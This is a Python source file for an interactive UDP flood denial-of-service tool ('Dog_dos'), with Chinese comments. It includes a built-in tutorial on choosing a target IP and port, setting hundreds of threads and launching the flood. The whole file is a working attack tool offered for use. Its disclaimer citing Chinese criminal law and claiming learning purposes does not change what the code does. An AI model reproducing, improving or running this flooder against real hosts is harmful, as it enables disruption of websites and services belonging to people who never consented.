'''
Author: Lucky Pupil ;
Date:2022.05.01 ;
National: Chinese ;
Project Name: Dos Attack ;
'''
import socket #导入攻击库
from threading import Thread # 导入多线程库
import cmd
from sys import exit # 为了使用exit函数
from time import sleep# 为了使用sleep函数

str_byte = '我是在攻击你' * 500
randbyte = str_byte.encode() # 生成攻击数据包
so = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) # 生成攻击服务器
threads = [] # 多线程列表


class Main(cmd.Cmd):
	prompt = 'Dog_dos>' # 终端前缀
	intro = '本工具仅限学习与装逼使用，请勿用于违法用途\n根据《刑法》第二百八十五条规定\n侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。\n如非法使用，后果自负' #终端提示语
	
	def __init__(self):
		super(Main,self).__init__()
		self.thread = 500
		self.port = 80
		
	def do_tutorial(self,arg): #教程调用函数
		'教你如何使用本工具'
		self.tutorial(arg)

	def do_set_thread_num(self,arg): # 线程数量设置调用函数
		'设置攻击线程数量'
		self.set_thread_num(arg)

	def do_set_port(self,arg): # 攻击端口设置调用函数
		'设置攻击端口'
		self.set_port(arg)

	def do_set_ip(self,arg): #攻击IP设置调用函数
		'设置攻击ip'
		self.set_ip(arg)

	def do_attack(self,arg): # 攻击函数调用函数
		'攻击函数'
		self.attack(arg)

	def do_exit(self,arg): #退出函数调用函数
		'退出'
		self.exit(arg)

	def exit(self,arg): #退出函数
		exit(0)

	def tutorial(self,chose): #教程 --> 操作流程我程序最后会写注释的
		print('首先，你必须使用"set_port"命令设置攻击目标端口，一般为80')
		sleep(1)
		print('再者，你必须使用"set_ip"命令设置攻击目标IP地址，注意，是IP地址！可以用commond命令行里的ping命令+网址获取网址的IP地址')
		sleep(1)
		print('然后，你必须使用"set_thread_num"命令设置攻击线程数量，线程越多，攻击效率，以及攻击成功的可能性越高，但是不是越多越好，多了电脑容易卡，根据自己电脑情况决定，建议数量为500.')
		sleep(1)
		print('最后，使用"attack"命令，进行攻击，输入y,即可开始攻击，会显示攻击次数，有可能又被网站管理员拉黑的风险，后果自负')
	def set_thread_num(self,num):
		self.thread = int(num)
		print('Set thread ', num)

	def set_port(self,num): # 设置端口
		self.port = int(num)
		print('Set port ', num)

	def set_ip(self,ip): # 设置IP
		self.ip = ip
		print('Set IP address ', ip)

	def attack(self,chose):# 攻击函数
		chose = input('你真的要攻击吗\n根据《刑法》第二百八十五条规定\n侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。（确定输入y，终止输入n）')
		if chose == 'y' or chose == 'Y': #确定
			self.true_to_attack() # attack
		elif chose == 'n' or chose == 'N':
			self.exit()# 退出
		else:
			print('请规范输入') #用户输入错误，让他再输一遍
			self.attack()
			
	def true_to_attack_attack(self): # 攻击主体部分
		for i in range(20001):# 重复20002次，可以随意调整
			try:
				so.sendto(randbyte,(self.ip,self.port)) # 发送数据包，格式socket.sendto(data,(IP,port))
			except Exception:
				print('您没有设置IP地址或者没有正确设置IP地址')
				break
			print('这是第',i+1,'攻击!') #输出，让用户知道在攻击

	def true_to_attack_thread(self): # 攻击线程启动与设置部分
		for i in range(1,self.thread+1): # 重复线程数量次
			sleep(0.1) #防止卡顿
			send = Thread(target=self.true_to_attack_attack,args=()) # 生成多线程类
			threads.append(send) # 添加至列表
			print(i,"个线程生成成功") # 打印
		for j in threads: # 遍历线程列表
			j.start() # 启动线程

	def true_to_attack(self): # 启动攻击
		self.true_to_attack_thread()


Main().cmdloop()
